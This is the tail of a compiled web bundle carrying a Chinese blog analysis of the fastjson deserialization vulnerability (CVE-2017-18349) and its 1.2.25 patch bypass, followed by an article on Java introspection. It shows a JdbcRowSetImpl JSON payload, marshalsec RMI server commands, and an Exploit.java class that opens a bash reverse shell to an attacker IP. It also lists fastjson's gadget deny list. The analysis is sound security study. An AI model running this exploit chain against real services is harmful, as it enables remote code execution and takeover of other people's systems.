punctuation">{</span>\n        <span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,\n        <span class="token string">&quot;dataSourceName&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;rmi://192.168.111.129:9999/Exploit&quot;</span>,\n        <span class="token string">&quot;autoCommit&quot;</span>:true\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p><strong>【marshalsec】</strong></p>',12),jn={href:"https://github.com/mbechler/marshalsec",target:"_blank",rel:"noopener noreferrer"},An=(0,t.Fv)('<ul><li><p>编译 marshalsec：<code>mvn clean package -DskipTests</code>​</p></li><li><p>开启 RMI Server：<code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.111.129:8000/#Exploit&quot; 9999</code>​</p></li><li><p>Exploit.java 并编译放到 RMI Server 上</p></li><li><p>攻击机开启 8000（默认）端口的 HTTP 服务，在 Exploit.class 所在目录执行</p><ul><li>​<code>python2 -m SimpleHTTPServer port</code>​</li><li>​<code>python3 -m http.server port</code>​</li></ul></li><li><p>攻击机（服务器）开启 2333 端口监听，等待靶机将 shell 送上来</p></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// javac Exploit.java</span>\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token keyword">try</span><span class="token punctuation">{</span>\n            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.111.129/2333 0&gt;&amp;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>\n            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">Exploit</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_1-2-25-补丁绕过分析" tabindex="-1"><a class="header-anchor" href="#_1-2-25-补丁绕过分析"><span>1.2.25 补丁绕过分析</span></a></h2><h3 id="调试查看" tabindex="-1"><a class="header-anchor" href="#调试查看"><span>调试查看</span></a></h3><p>把 maven 依赖换成 1.2.25 可以看到如下报错，调试看看。</p><p>​<img src="'+an+'" alt="image" loading="lazy">​</p><p>发现将 <code>DefaultJSONParser.parseObject()</code>​ 函数中的 <code>TypeUtils.loadClass</code>​ 替换为 <code>checkAutoType()</code>​ 函数。</p><p>​<img src="'+tn+'" alt="image" loading="lazy">​</p><p>简单地说，<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>​ 函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList 为白名单（默认为空，可手动添加），denyList 为黑名单（默认不为空）。</p><p>默认情况下，autoTypeSupport 为 False，即先进行黑名单过滤，遍历 denyList，如果引入的库以 denyList 中某个 deny 开头，就会抛出异常，中断运行。</p><p>​<img src="'+en+'" alt="image" loading="lazy">​</p><p>denyList 黑名单中列出了常见的反序列化漏洞利用链 Gadgets。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>denyList <span class="token operator">=</span> \n <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">&quot;bsh&quot;</span>\n <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">&quot;com.mchange&quot;</span>\n <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">&quot;com.sun.&quot;</span>\n <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">&quot;java.lang.Thread&quot;</span>\n <span class="token number">4</span> <span class="token operator">=</span> <span class="token string">&quot;java.net.Socket&quot;</span>\n <span class="token number">5</span> <span class="token operator">=</span> <span class="token string">&quot;java.rmi&quot;</span>\n <span class="token number">6</span> <span class="token operator">=</span> <span class="token string">&quot;javax.xml&quot;</span>\n <span class="token number">7</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.bcel&quot;</span>\n <span class="token number">8</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.beanutils&quot;</span>\n <span class="token number">9</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.collections.Transformer&quot;</span>\n <span class="token number">10</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.collections.functors&quot;</span>\n <span class="token number">11</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.collections4.comparators&quot;</span>\n <span class="token number">12</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.commons.fileupload&quot;</span>\n <span class="token number">13</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.myfaces.context.servlet&quot;</span>\n <span class="token number">14</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.tomcat&quot;</span>\n <span class="token number">15</span> <span class="token operator">=</span> <span class="token string">&quot;org.apache.wicket.util&quot;</span>\n <span class="token number">16</span> <span class="token operator">=</span> <span class="token string">&quot;org.codehaus.groovy.runtime&quot;</span>\n <span class="token number">17</span> <span class="token operator">=</span> <span class="token string">&quot;org.hibernate&quot;</span>\n <span class="token number">18</span> <span class="token operator">=</span> <span class="token string">&quot;org.jboss&quot;</span>\n <span class="token number">19</span> <span class="token operator">=</span> <span class="token string">&quot;org.mozilla.javascript&quot;</span>\n <span class="token number">20</span> <span class="token operator">=</span> <span class="token string">&quot;org.python.core&quot;</span>\n <span class="token number">21</span> <span class="token operator">=</span> <span class="token string">&quot;org.springframework&quot;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="autotypesupport" tabindex="-1"><a class="header-anchor" href="#autotypesupport"><span>AutoTypeSupport</span></a></h3><p>autoTypeSupport 是 <code>checkAutoType()</code>​ 函数出现后 ParserConfig.java 中新增的一个配置选项，在 checkAutoType() 函数的某些代码逻辑起到开关的作用。</p><p>默认情况下 autoTypeSupport 为 False，将其设置为 True 有两种方法：</p><ul><li>JVM 启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code>​</li><li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>​，如果有使用非全局 ParserConfig 则用另外调用 <code>setAutoTypeSupport(true);</code>​</li></ul><p>AutoType 白名单设置方法：</p><ol><li>JVM 启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code>​</li><li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code>​</li><li>通过 fastjson.properties 文件配置。在 <code>1.2.25/1.2.26</code>​ 版本支持通过类路径的 fastjson.properties 文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code>​​</li></ol><p>接下来分析对各个补丁版本的 <code>checkAutoType()</code>​ 黑名单绕过。</p><p>‍</p><p>待续......</p><h2 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h2>',23),wn={href:"https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/",target:"_blank",rel:"noopener noreferrer"},Sn={href:"https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC",target:"_blank",rel:"noopener noreferrer"},qn={href:"https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/",target:"_blank",rel:"noopener noreferrer"},xn={href:"https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0",target:"_blank",rel:"noopener noreferrer"},Jn={href:"https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/",target:"_blank",rel:"noopener noreferrer"},On=(0,t.Lk)("p",null,"[^1]: # Java 内省（Introspection）",-1),En=(0,t.Lk)("pre",null,[(0,t.Lk)("code",null,'## 什么是内省\n\n### 计算机科学中的内省\n\n在计算机科学中，**[内省](https://zh.wikipedia.org/wiki/%E5%86%85%E7%9C%81_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6))**​**是指计算机程序在运行时（Runtime）检查对象（Object）类型的一种能力，通常也可以称作“运行时类型检查&quot;。** 一些编程语言如 C++、Java、Ruby、PHP、Objective-C、Perl 等等具有这种特性。\n\n不应该将内省和反射混淆。相对于内省，**反射更进一步，是指计算机程序在运行时（Runtime）可以访问、检测和**​**修改****它本身状态或行为的一种能力。** 一些编程语言比如 Java 具有反射特性，而 C++ 不具有反射特性只具有内省特性。\n\n### Java 中的内省\n\nJava 中的反射机制是通过名称得到类的方法和对象的成份，对于一切 Java 类都是适用的，但是有时候使用起来比较麻烦。而 JavaBean 是一种特殊的 Java 类，遵守 [JavaBean 的规范](https://www.oracle.com/java/technologies/javase/javabeans-spec.html)，即所有的成员都是私有成员，且每个成员都有公开的读取和设定的方法（`getter`​ 和 `setter`​），且这些方法都遵守命名的规范。就是因为 JavaBean 有这些的特性，sun 推出了一种**专门对 JavaBean 成员进行访问的技术**，方便对其的访问，就是内省技术。【JDK 提供了一套 API 用来访问某个属性的 getter/setter 方法、这个就是 Java 内省。】\n\n内省/自省机制(Introspector)：**是 Java 语言对 JavaBean 类属性、事件的一种缺省处理方法。** \n\n---\n\n例如类 A 中有属性 name，那我们可以通过 getName,setName 来得到其值或者设置新的值。通过 `getName/setName`​ 来访问 name 属性，这就是默认的规则。Java 中提供了一套 API 用来访问某个属性的 `getter/setter`​ 方法，通过这些 API 可以使你不需要了解这个规则（但你最好还是要搞清楚），这些 API 存放于包 java.beans 中。\n\n一般的做法是通过类 `Introspector`​ 来获取某个对象的 BeanInfo 信息，然后通过 BeanInfo 来获取属性的描述器（PropertyDescriptor），通过这个属性描述器就可以获取某个属性对应的 `getter/setter`​ 方法，然后我们就可以通过反射机制来调用这些方法。\n\n---\n\n **【内省和反射的区别】**\n\n自省就是面向对象的语言所写的程序在运行时，能够知道对象的类型。简单来说就是在程序运行过程中能知道对象类型（还有属性等）的能力。一个类该做哪些事情由这个类本身就决定了，而非外部调用者。\n\n**内省机制是通过反射来实现的，内省可以算是对反射的扩充。**\n\n自省是获取对象类型的能力，而反射是操纵对象的值，元数据，属性或函数的能力。\n\n比如一个类只有 get 和 set 方法，那么明显这个类的主要任务就是封装数据，则把这个类传入对应内省构造器中，无须你在挨个 set。\n\n1. **==反射针对的是任何类、任何对象、而内省只是针对 JavaBean。内省通过反射来操作 JavaBean 的属性。==**\n2. 内省设置属性值肯定**调用** setter 方法、而反射则不一定 (Field 对象)\n3. 反射就像是镜子、能看到对象的所有、是客观事实。内省更像是主观判断、比如看到 `getClass()`​、内省就会认为这个类中有 class 字段、但事实上则不一定。\n\n## 内省机制\n\n### 作用\n\n用于查看和操作 JavaBean 中的属性：就是对象自身提供可以查看自身属性、方法、类型的手段。\n\n1. 获取 JavaBean 中的每一个属性名/属性类型\n2. 通过 getter 方法获取属性值，通过 setter 方法给属性设置值\n\n### 几个核心类\n\n内省机制中使用到的核心几个类，列举几个常用方法，具体查看 API。\n\n1. **java.beans.Introspector 类**\n\nIntrospector 相当于一个工具类，提供了一种标准的工具来了解目标 JavaBean 支持的属性，事件和方法，即一系列取得 Bean 信息的方法。\n\n```java\ngetBeanInfo(Class beanClass)\n// 内省 JavaBean 并了解其所有属性，暴露的方法和事件。\n```\n2. **java.beans.BeanInfo 接口**\n\nBeanInfo 接口是对一个 Bean 的描述，可以通过它取得 Bean 内部的信息。\n\n```java\ngetEventSetDescriptors()\n// 返回 bean 定义，此 bean 触发的事件类型的事件描述符。\n```\n3. **java.beans.PropertyDescriptor 类**\n\nPropertyDescriptor 类是对一个 JavaBean 属性的描述，通过属性描述符我们能知道这个属性的类型，获取到操纵属性的方法（getter/setter/...）。\n\n```java\ngetPropertyType()\n// 返回属性的 Java 类型信息，获得属性的 Class 对象\n\ngetReadMethod()\n// 获得用于读取属性值的方法\n\ngetWriteMethod()\n// 获得用于写入属性值的方法\n\nhashCode()\n// 获取对象的哈希值\n\nsetReadMethod(Method readMethod)\n// 设置用于读取属性值的方法\n\nsetWriteMethod(Method writeMethod)\n// 设置用于写入属性值的方法。\n```\n4. **java.beans.FeatureDescriptor 类**\n\nFeatureDescriptor 类是 `PropertyDescriptor`​，`EventSetDescriptor`​ 和 `MethodDescriptor`​ 等的常见基类 (父类)。\n\n它支持一些可以为任何内省描述符设置和检索的常见信息。\n\n```java\ngetName()\n// 获取此功能的方法名称。\n```\n### Demo\n\n#### 通过内省机制获取 JavaBean 属性值和属性设值\n\n **【User Class】**\n\n```java\npublic class User {\n    private Long id;\n    private String username;\n    private Integer age;\n    private Long account;\n \n    public User() {\n    }\n \n    // getter, setter 方法\n    // ...\n    @Override\n    public String toString() {\n        return "User{" + "Id = " + id +\n                ", Name = " + username +\n                ", Age = " + age +\n                ", Account = " + account +\n                "};";\n    }\n}\n\n```\n **【Test Class】**\n\n```java\npackage demo;\n\nimport java.beans.BeanInfo;\nimport java.beans.Introspector;\nimport java.beans.PropertyDescriptor;\n\npublic class Test {\n    public static void testIntrospector() throws Exception {\n        User user = User.class.newInstance();\n        user.setId(111L);\n\n        // 获取 JavaBean 的描述对象 BeanInfo\n        // BeanInfo beanInfo = Introspector.getBeanInfo(User.class); // 包含父类的，比如：getClass()\n        BeanInfo beanInfo = Introspector.getBeanInfo(User.class, Object.class); // 不包含父类的\n        // 获取 JavaBean 中所有属性的描述器对象 PropertyDescriptor\n        PropertyDescriptor[] pds = beanInfo.getPropertyDescriptors();\n\n        for (PropertyDescriptor pd : pds) {\n            // 获取当前属性的名称\n            String name = pd.getName();\n\n            if("id".equals(name)){\n                // 调用 getter 方法，获取属性值\n                Object value = pd.getReadMethod().invoke(user);\n                System.out.println(value); // 111\n            }\n            if("username".equals(name)){\n                // 获取当前属性的数据类型\n                Class<?> propertyType = pd.getPropertyType();\n                System.out.println(propertyType); // class java.lang.String\n                // 调用 setter 方法，设置属性值\n                pd.getWriteMethod().invoke(user,"香香");\n            }\n            if("age".equals(name)){\n                pd.getWriteMethod().invoke(user,17);\n            }\n        }\n        System.out.println(user); // User{id = 111, username = 香香, age = 17, account = null}\n    }\n\n    public static void main(String[] args) throws Exception {\n        testIntrospector();\n    }\n}\n\n```\n​![image](assets/image-20240410151226-wmkm2l9.png)​\n\n#### JavaBean 与 Map 之间的相互转换\n\n```java\n// JavaBean 对象转 Map<String,Object>\npublic static Map<String,Object> bean2map(Object bean) throws Exception {\n    Map<String,Object> map = new HashMap<>();\n    BeanInfo beanInfo = Introspector.getBeanInfo(bean.getClass(), Object.class);\n    PropertyDescriptor[] pds = beanInfo.getPropertyDescriptors();\n\n    for (PropertyDescriptor pd : pds) {\n        String name = pd.getName();\n        Object value = pd.getReadMethod().invoke(bean);\n        map.put(name,value);\n    }\n\n    return map;\n}\n\n// Map<String,Object> 转 JavaBean 对象\npublic static <T> T map2bean(Map<String, Object> map, Class<T> clazz) throws Exception {\n    T t = clazz.newInstance();\n    BeanInfo beanInfo = Introspector.getBeanInfo(clazz, Object.class);\n    PropertyDescriptor[] pds = beanInfo.getPropertyDescriptors();\n\n    for (PropertyDescriptor pd : pds) {\n        Object value = map.get(pd.getName());\n        pd.getWriteMethod().invoke(t,value);\n    }\n\n    return t;\n}\n\npublic static void testChange() throws Exception {\n    User user = new User();\n    user.setUsername("赵云");\n    user.setAge(18);\n\n    Map<String, Object> map = bean2map(user);\n    System.out.println(map); // {id=null, account=null, age=18, username=赵云}\n\n    map.put("account",8888L);\n    Class<User> userClass = User.class;\n    User user1 = map2bean(map, userClass);\n    System.out.println(user1);// User{Id = null, Name = 赵云, Age = 18, Account = 8888};\n}\n```\n​![image](assets/image-20240410152655-vz05lwb.png)​\n\n## 总结\n\n* 使用内省机制对 JavaBean 属性进行操作还是很复杂的，一些第三方组织封装了某些工具类来方便开发者使用，如：`org.apache.commons.beanutils.BeanUtils`​ 是 apache 封装的工具类，用来解决使用内省机制繁琐的问题，包含了挺多方法。\n\n  使用时要导入两个包：[commons-beanutils-xx.jar](http://commons.apache.org/beanutils/) 和 [commons-logging-xx.jar](http://commons.apache.org/logging/)​​。\n* 将 Java 的反射以及内省应用到程序设计中去可以大大的提供程序的智能化和可扩展性。有很多项目或者框架都是采取这两种技术来实现其核心功能。比如 Struts2，SpringMVC。\n\n  这些框架只要在. action 中，或者 controller 方法的形参处，引入 JavaBean 就可以实例化这个 JavaBean 的值，并且可以获得表单提交的数据，那么它究竟是怎么得到的呢？\n\n  其实就是 `request.getParameterMap()`​ 获取得到表单提交来的所有键值对，只不过框架内部封装了，**然后框架内部利用内省，将数据封装到 JavaBean 中**。\n* Java 的反射以及内省机制重点掌握，查阅框架源码时多加留意，理解其中的设计重构封装等思想。\n\n## 前人栽树\n\n* [Java 内省机制 - 别再闹了 - 博客园 (cnblogs.com)](https://www.cnblogs.com/jiading/articles/12486921.html)\n* [深入理解 Java：内省(Introspector) - peida - 博客园 (cnblogs.com)](https://www.cnblogs.com/peida/archive/2013/06/03/3090842.html)\n* [JavaBean - 廖雪峰的官方网站 (liaoxuefeng.com)](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)\n* [Java 内省 (qq.com)](https://mp.weixin.qq.com/s/7Z4xdRtzsc3gek12PwqKTA)\n')],-1),Nn={},In=(0,a(7708).A)(Nn,[["render",function(n,s){const a=(0,t.g2)("ExternalLinkIcon");return(0,t.uX)(),(0,t.CE)("div",null,[(0,t.Lk)("blockquote",null,[(0,t.Lk)("p",null,[(0,t.Lk)("a",pn,[(0,t.eW)("alibaba/fastjson: FASTJSON 2.0.x has been released, faster and more secure, recommend you upgrade. (github.com)"),(0,t.bF)(a)])])]),on,(0,t.Lk)("p",null,[(0,t.Lk)("a",cn,[(0,t.eW)("Fastjson"),(0,t.bF)(a)]),(0,t.eW)(" 是一个 Java 库，可用于将 Java 对象转换为其 JSON 表示形式。它还可用于将 JSON 字符串转换为等效的 Java 对象。 Fastjson 可以处理任意 Java 对象，包括您没有源代码的现有对象。")]),ln,(0,t.Lk)("ol",null,[un,rn,(0,t.Lk)("li",null,[(0,t.eW)("在 "),(0,t.Lk)("a",kn,[(0,t.eW)("Maven Repository: com.alibaba » fastjson (mvnrepository.com)"),(0,t.bF)(a)]),(0,t.eW)(" 有所有的版本依赖信息。")])]),dn,(0,t.Lk)("blockquote",null,[(0,t.Lk)("p",null,[(0,t.Lk)("a",mn,[(0,t.eW)("Java 安全之 Fastjson 反序列化漏洞分析 - nice_0e3"),(0,t.bF)(a)])])]),vn,(0,t.Lk)("p",null,[(0,t.eW)("需要添加 "),(0,t.Lk)("a",bn,[(0,t.eW)("unboundid-ldapsdk"),(0,t.bF)(a)]),(0,t.eW)(" 依赖")]),gn,(0,t.Lk)("blockquote",null,[(0,t.Lk)("ul",null,[(0,t.Lk)("li",null,[(0,t.Lk)("a",yn,[(0,t.eW)("wyzxxz/jndi_tool: JNDI 服务利用工具 RMI/LDAP，支持部分场景回显、内存 shell，高版本 JDK 场景下利用等，fastjson rce 命令执行，log4j rce 命令执行 漏洞检测辅助工具 (github.com)"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",fn,[(0,t.eW)("mbechler/marshalsec (github.com)"),(0,t.bF)(a)])])])]),hn,(0,t.Lk)("p",null,[(0,t.eW)("借助 "),(0,t.Lk)("a",jn,[(0,t.eW)("marshalsec"),(0,t.bF)(a)]),(0,t.eW)(" 项目启动一个 rmi 服务器，监听一个端口，并指定加载远程类 Exploit.class。")]),An,(0,t.Lk)("ul",null,[(0,t.Lk)("li",null,[(0,t.Lk)("a",wn,[(0,t.eW)("Fastjson 系列一——反序列化漏洞基本原理 [ Mi1k7ea ]"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",Sn,[(0,t.eW)("Fastjson 系列二——1.2.22-1.2.24 反序列化漏洞 [ Mi1k7ea ]"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",qn,[(0,t.eW)("Fastjson 反序列化漏洞基础 · BlBana's BlackHouse"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",xn,[(0,t.eW)("Java 安全之 Fastjson 反序列化漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)"),(0,t.bF)(a)])]),(0,t.Lk)("li",null,[(0,t.Lk)("a",Jn,[(0,t.eW)("Fastjson 远程反序列化程序验证的构造和分析 – 绿盟科技技术博客 (nsfocus.net)"),(0,t.bF)(a)])])]),On,En])}]]),Bn=JSON.parse('{"path":"/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A0).html","title":"fastjson 反序列化 (Ⅰ)","lang":"zh-CN","frontmatter":{"title":"fastjson 反序列化 (Ⅰ)","description":"alibaba/fastjson: FASTJSON 2.0.x has been released, faster and more secure, recommend you upgrade. (github.com) 什么是 fastjson Fastjson 是一个 Java 库，可用于将 Java 对象转换为其 JSON 表示形式。它还可用于...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A0).html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"fastjson 反序列化 (Ⅰ)"}],["meta",{"property":"og:description","content":"alibaba/fastjson: FASTJSON 2.0.x has been released, faster and more secure, recommend you upgrade. (github.com) 什么是 fastjson Fastjson 是一个 Java 库，可用于将 Java 对象转换为其 JSON 表示形式。它还可用于..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"fastjson 反序列化 (Ⅰ)\\",\\"image\\":[\\"\\"],\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"什么是 fastjson","slug":"什么是-fastjson","link":"#什么是-fastjson","children":[]},{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"测试 Demo","slug":"测试-demo","link":"#测试-demo","children":[{"level":3,"title":"疑问一：映射关系","slug":"疑问一-映射关系","link":"#疑问一-映射关系","children":[]},{"level":3,"title":"疑问二：顺序关系","slug":"疑问二-顺序关系","link":"#疑问二-顺序关系","children":[]},{"level":3,"title":"疑问三：@type​","slug":"疑问三-type​","link":"#疑问三-type​","children":[]},{"level":3,"title":"反序列化","slug":"反序列化","link":"#反序列化","children":[]},{"level":3,"title":"Feature.SupportNonPublicField","slug":"feature-supportnonpublicfield","link":"#feature-supportnonpublicfield","children":[]},{"level":3,"title":"Parse 和 ParseObject 区别","slug":"parse-和-parseobject-区别","link":"#parse-和-parseobject-区别","children":[]}]},{"level":2,"title":"总结一","slug":"总结一","link":"#总结一","children":[]},{"level":2,"title":"Fastjson 反序列化流程","slug":"fastjson-反序列化流程","link":"#fastjson-反序列化流程","children":[{"level":3,"title":"反序列化类图","slug":"反序列化类图","link":"#反序列化类图","children":[]},{"level":3,"title":"反序列化特点","slug":"反序列化特点","link":"#反序列化特点","children":[]},{"level":3,"title":"反序列化原理","slug":"反序列化原理","link":"#反序列化原理","children":[]}]},{"level":2,"title":"CVE-2017-18349（fastjson <= 1.2.24）","slug":"cve-2017-18349-fastjson-1-2-24","link":"#cve-2017-18349-fastjson-1-2-24","children":[{"level":3,"title":"Demo","slug":"demo","link":"#demo","children":[]},{"level":3,"title":"EvilClass","slug":"evilclass","link":"#evilclass","children":[]},{"level":3,"title":"ClassToBase64","slug":"classtobase64","link":"#classtobase64","children":[]},{"level":3,"title":"TemplatesImpl Exploit","slug":"templatesimpl-exploit","link":"#templatesimpl-exploit","children":[]},{"level":3,"title":"总结 1_1","slug":"总结-1-1","link":"#总结-1-1","children":[]},{"level":3,"title":"JdbcRowSetImpl Exploit","slug":"jdbcrowsetimpl-exploit","link":"#jdbcrowsetimpl-exploit","children":[]}]},{"level":2,"title":"工具","slug":"工具","link":"#工具","children":[]},{"level":2,"title":"1.2.25 补丁绕过分析","slug":"_1-2-25-补丁绕过分析","link":"#_1-2-25-补丁绕过分析","children":[{"level":3,"title":"调试查看","slug":"调试查看","link":"#调试查看","children":[]},{"level":3,"title":"AutoTypeSupport","slug":"autotypesupport","link":"#autotypesupport","children":[]}]},{"level":2,"title":"前人栽树","slug":"前人栽树","link":"#前人栽树","children":[]}],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"readingTime":{"minutes":36.88,"words":11064},"filePathRelative":"codereview/【JavaSec】漏洞分析/fastjson 反序列化 (Ⅰ).md","autoDesc":true}')}}]);